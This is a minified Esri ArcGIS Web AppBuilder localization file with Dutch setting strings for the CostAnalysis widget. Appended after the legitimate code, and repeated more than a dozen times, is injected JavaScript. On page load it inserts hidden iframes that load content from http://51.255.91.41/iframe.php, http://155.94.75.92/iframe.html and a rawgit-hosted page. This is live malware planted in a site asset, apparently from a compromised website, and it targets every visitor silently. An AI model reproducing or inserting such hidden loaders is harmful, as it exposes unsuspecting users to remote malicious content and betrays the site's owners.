// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Configuratietekst instellen:",generalSettings:{tabTitle:"Algemene instellingen",measurementUnitLabel:"Meeteenheid",currencyLabel:"Meetsymbool",roundCostLabel:"Afgeronde kosten",projectOutputSettings:"Projectuitvoersinstellingen",typeOfProjectAreaLabel:"Type projectgebied",bufferDistanceLabel:"Bufferafstand",roundCostValues:{twoDecimalPoint:"Twee decimale punten",nearestWholeNumber:"Dichtstbijzijnde hele nummer",nearestTen:"Dichtstbijzijnde tien",
nearestHundred:"Dichtstbijzijnde honderd",nearestThousand:"Dichtstbijzijnde duizenden",nearestTenThousands:"Dichtstbijzijnde tien duizenden"},projectAreaType:{outline:"Omtreklijn",buffer:"Buffer"},errorMessages:{currency:"Ongeldige valuta-eenheid",bufferDistance:"Ongeldige bufferafstand",outOfRangebufferDistance:"De waarde moet groter dan 0 en kleiner dan of gelijk aan 100 zijn"}},projectSettings:{tabTitle:"Projectinstellingen",costingGeometrySectionTitle:"Definieer geografie voor kosten (optioneel)",
costingGeometrySectionNote:"Opmerking: als u deze laag configureert, kan de gebruiker kostenvergelijkingen van objectsjablonen instellen op basis van geografische regio's.",projectTableSectionTitle:"Mogelijkheid om projectinstellingen op te slaan/te laden (optioneel)",projectTableSectionNote:"Opmerking: Door alle tabellen en lagen te configureren, kan de gebruiker het project opslaan/laden voor later gebruik.",costingGeometryLayerLabel:"Kosten geometrielaag",fieldLabelGeography:"Geografie Veld naar laag",
projectAssetsTableLabel:"Tabel projectassets",projectMultiplierTableLabel:"Tabel projectmultiplicator extra kosten",projectLayerLabel:"Projectlaag",configureFieldsLabel:"Velden configureren",fieldDescriptionHeaderTitle:"Veldbeschrijving",layerFieldsHeaderTitle:"Laagveld",selectLabel:"Selecteren",errorMessages:{duplicateLayerSelection:"${layerName} is al geselecteerd",invalidConfiguration:"Selecteer ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eVlaklaag (-lagen) met de volgende voorwaarden wordt getoond: \x3cbr/\x3e \x3cli\x3e\tLaag moet \u00e2\u20ac\u0153Query\u00e2\u20ac\u009d-capaciteit hebben\x3c/li\x3e\x3cli\x3e\tLaag moet een GlobalID-veld hebben\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eString en numerieke velden van de geselecteerde \u00e2\u20ac\u0153Costing Geometry Layer\u00e2\u20ac\u009d worden weergegeven in de \u00e2\u20ac\u0153Field to Label Geography\u00e2\u20ac\u009d-keuzelijst.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eTabel(len) met de volgende voorwaarden wordt getoond: \x3cbr/\x3e \x3cli\x3eTabel moet bewerkingsmogelijkheden hebben, namelijk \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d en \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabel moet zes velden hebben met exacte naam en gegevenstype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID-veldtype)\x3c/li\x3e\x3cli\x3e\tCostEquation (String-veldtype)\x3c/li\x3e\x3cli\x3e\tScenario (String-veldtype)\x3c/li\x3e\x3cli\x3e\tTemplateName (String-veldtype)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID-veldtype)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID-veldtype)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabel(len) met de volgende voorwaarden wordt getoond: \x3cbr/\x3e \x3cli\x3eTabel moet bewerkingsmogelijkheden hebben, namelijk \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d en \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabel moet vijf velden hebben met exacte naam en gegevenstype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tBeschrijving (String-veldtype)\x3c/li\x3e\x3cli\x3e\tType (String-veldtype)\x3c/li\x3e\x3cli\x3e\tWaarde (Float/Double-veldtype)\x3c/li\x3e\x3cli\x3e\tCostindex (Integer-veldtype)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID-veldtype))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eVlaklaag (-lagen) met de volgende voorwaarden wordt getoond: \x3cbr/\x3e \x3cli\x3eLaag moet bewerkingsmogelijkheden hebben, namelijk \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d en \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLaag moet vijf velden hebben met exacte naam en gegevenstype:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (String-veldtype)\x3c/li\x3e\x3cli\x3eBeschrijving (String-veldtype)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double-veldtype)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double-veldtype)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID-veldtype)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Laaginstellingen",layerNameHeaderTitle:"Kaartlaagnaam",layerNameHeaderTooltip:"Lijst van lagen op de kaart",EditableLayerHeaderTitle:"Bewerkbaar",EditableLayerHeaderTooltip:"Neem de laag en de sjablonen op in de kostenwidget",SelectableLayerHeaderTitle:"Selecteerbaar",SelectableLayerHeaderTooltip:"Geometrie van object kan gebruikt worden om een nieuw kostenelement te genereren",fieldPickerHeaderTitle:"Project-ID (optioneel)",fieldPickerHeaderTooltip:"Optioneel veld (van het type string) om de project-ID in op te slaan",
selectLabel:"Selecteren",noAssetLayersAvailable:"Geen assetlaag gevonden in de geselecteerde webkaart",disableEditableCheckboxTooltip:"Deze laag heeft geen bewerkingsmogelijkheden"},costingInfo:{tabTitle:"Kosteninformatie",proposedMainsLabel:"Voorgestelde leidingen",addCostingTemplateLabel:"Voeg kostensjabloon toe",manageScenariosTitle:"Beheer scenario\u2019s",featureTemplateTitle:"Objectsjabloon",costEquationTitle:"Kostenvergelijking",geographyTitle:"Geografie",scenarioTitle:"Scenario",actionTitle:"Acties",
scenarioNameLabel:"Scenarionaam",addBtnLabel:"Toevoegen",srNoLabel:"Nee.",deleteLabel:"Verwijderen",duplicateScenarioName:"Scenarionaam dupliceren",hintText:"\x3cdiv\x3eTip: Gebruik de volgende trefwoorden\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: gebruikt het totale aantal van hetzelfde type asset in een geografie\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: gebruikt de lengte voor het regelasset en het gebied voor het vlakasset\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: gebruikt de totale lengte voor het regelasset en het totale gebied voor vlakasset van hetzelfde type in een geografie\x3c/li\x3e\x3c/ul\x3eU kunt functies gebruiken als:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eBewerk de kostenvergelijking volgens uw projectbehoefte.",
noneValue:"Geen",requiredCostEquation:"Ongeldige kostenvergelijking voor ${layerName} : ${templateName}",duplicateTemplateMessage:"Er bestaat een dubbele sjablooninvoer voor ${layerName} : ${templateName}",defaultEquationRequired:"Standaardvergelijking is vereist voor ${layerName} : ${templateName}",validCostEquationMessage:"Voer geldige kostenvergelijking in",costEquationHelpText:"Bewerk de kostenvergelijking volgens uw projectbehoefte",scenarioHelpText:"Selecteer het scenario volgens uw projectbehoefte",
copyRowTitle:"Kopieer rij",noTemplateAvailable:"Voeg ten minste \u00e9\u00e9n sjabloon toe voor ${layerName}",manageScenarioLabel:"Beheer scenario",noLayerMessage:"Voer ten minste \u00e9\u00e9n laag in ${tabName} in",noEditableLayersAvailable:"La(a)g(en) moet(en) worden aangevinkt als bewerkbaar op het tabblad Laaginstellingen"},statisticsSettings:{tabTitle:"Statistiekinstellingen",addStatisticsLabel:"Voeg statistieken toe",fieldNameTitle:"Veld",statisticsTitle:"Label",addNewStatisticsText:"Voeg nieuwe statistieken toe",
deleteStatisticsText:"Verwijder statistieken",moveStatisticsUpText:"Verplaats statistieken omhoog",moveStatisticsDownText:"Verplaats statistieken naar beneden",selectDeselectAllTitle:"Alles selecteren"},statisticsType:{countLabel:"Aantal",averageLabel:"Gemiddelde",maxLabel:"Maximum",minLabel:"Minimum",summationLabel:"Sommering",areaLabel:"Gebied",lengthLabel:"Lengte"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});